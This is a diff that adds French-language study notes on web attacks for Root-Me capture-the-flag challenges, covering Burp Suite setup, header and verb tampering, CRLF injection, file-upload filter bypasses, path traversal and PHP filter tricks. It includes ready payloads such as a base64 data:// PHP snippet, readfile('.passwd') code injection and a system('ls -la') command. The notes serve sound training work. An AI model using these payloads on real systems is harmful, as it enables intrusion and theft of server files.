@@ -1,0 +1,52 @@
+Pour tout ce qui touche a l'HTTP
+On va utiliser Burpsuite https://portswigger.net/burp/communitydownload
+Il faut paramétrer le proxy
+Dans firefox
+  Général -> Tout en bas -> Paramètres réseau
+    -> Configuration manuelle du proxy
+        -> Proxy HTTP = 127.0.0.1
+        -> Port = 8080
+
+Dans Burpsuite on laisse tout en défaut
+  Ensuite on va dans Proxy -> On met sur Intercept is on
+  On relance la page et la on fait nos modifs
+
+
+On peut également faire des requetes CURL
+  Permet de lister les infos
+  curl -v http://challenge01.root-me.org/web-serveur/ch5/
+
+  Permet de modifier le header
+  curl -v  -H "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
+
+Si on a un redirect avec genre ?redirect dans l'url ou des qu'on va sur une page on peut tenter une requete
+directement sur la page qu'on veut dès le début avec Burp ou Curl
+
+Quand un popup nous apparait pour qu'on se connecte on peut tenter une verb Tampering en remplacant GET ou POST
+par OPTIONS ou PUT
+
+Une faille qui existe pour phpbb
+ Il suffit d'aller /phpbb/install/install.php
+
+Une faille CLRF consiste à rajouter %0D%0A dans l'URL ce qui provoque un saut de ligne
+
+En cas de possibilité d'ajouter un fichier on peut avoir la sécurité de plusieurs façon :
+  -> Utiliser le système de double extension (On a notre fichier shell.php et on va le rename shell.php.jpeg
+    comme ça on peut passer à travers)
+  -> On peut modifier le content Type de la requete HTTP avec Burpsuite exemple : image/gif
+  -> On peut aussi rename notre fichier shell.php en shell.php%00.png
+  -> On peut aussi faire data ://text/plain ;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnaW5kZXgucGhwJyk7Pz4%3D
+  Ce qu'il y a en base64 c'est le code php
+  -> Ou on peut aussi utiliser un serveur distant avec ngrok 
+
+Ne pas hésiter à vérifier les cookies
+
+Si on voit que dans l'URL on peut modifier le chemin pour les fichiersne pas hésiter a tenter des trucs du style / ou ../
+  -> exemple : http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=/
+  -> On peut tenter des trucs avec du PHP dans la requete
+      -> http://challenge01.root-me.org/web-serveur/ch47/?page=about.php','..')||readfile('.passwd');strpos('xxx
+      -> '.system("ls -la").'
+  -> php://filter/read=convert.base64-encode/resource=page.php ca permet de voir le contenu de la page en base 64
+  -> Pensez a essayer le double encodage
+    -> php://filter/convert.base64-encode/resource=home ==> on double urlencode
+        php%253A%252F%252Ffilter%252Fconvert%252ebase64%252dencode%252Fresource%253Dhome
